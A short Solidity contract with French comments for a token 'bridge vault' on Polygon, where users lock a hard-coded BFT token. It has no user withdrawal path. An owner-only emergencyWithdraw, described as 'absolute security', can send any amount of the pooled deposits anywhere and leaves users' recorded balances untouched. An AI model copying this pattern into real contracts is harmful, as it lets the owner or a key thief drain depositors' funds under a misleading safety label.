 // SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title BFTBridgeVault
 * @dev Coffre-fort officiel connecté à votre jeton BFT sur Polygon Mainnet
 */
contract BFTBridgeVault is Ownable {
    // Adresse définitive de votre jeton BFT sur le Mainnet
    IERC20 public constant bftToken = IERC20(0x140098cCcdad0D8e63f8EF213cB3939e4d82d557);
    
    // Suivi informatique des soldes BFT verrouillés par utilisateur
    mapping(address => uint256) public bridgedBalances;

    event BFT_TokensLocked(address indexed user, uint256 amount, uint256 timestamp);
    event BFT_TokensUnlocked(address indexed user, uint256 amount, uint256 timestamp);

    // Le portefeuille qui déploie devient le propriétaire exclusif du coffre-fort
    constructor() Ownable(msg.sender) {}

    /**
     * @dev Bloque vos jetons BFT dans ce coffre-fort pour la future sidechain
     * @param amount Le montant brut avec les 18 décimales
     */
    function lockTokens(uint256 amount) external {
        require(amount > 0, "Montant doit etre superieur a 0");
        
        // Transfère les jetons BFT depuis votre portefeuille vers ce contrat
        bool success = bftToken.transferFrom(msg.sender, address(this), amount);
        require(success, "Echec du transfert BFT. Avez-vous valide l'approve ?");

        bridgedBalances[msg.sender] += amount;
        
        emit BFT_TokensLocked(msg.sender, amount, block.timestamp);
    }

    /**
     * @dev Sécurité absolue : Permet de récupérer les jetons BFT à tout moment 
     * vers l'adresse de votre choix si vous devez modifier la configuration sur votre Cloud.
     */
    function emergencyWithdraw(address to, uint256 amount) external onlyOwner {
        bftToken.transfer(to, amount);
    }
}
 
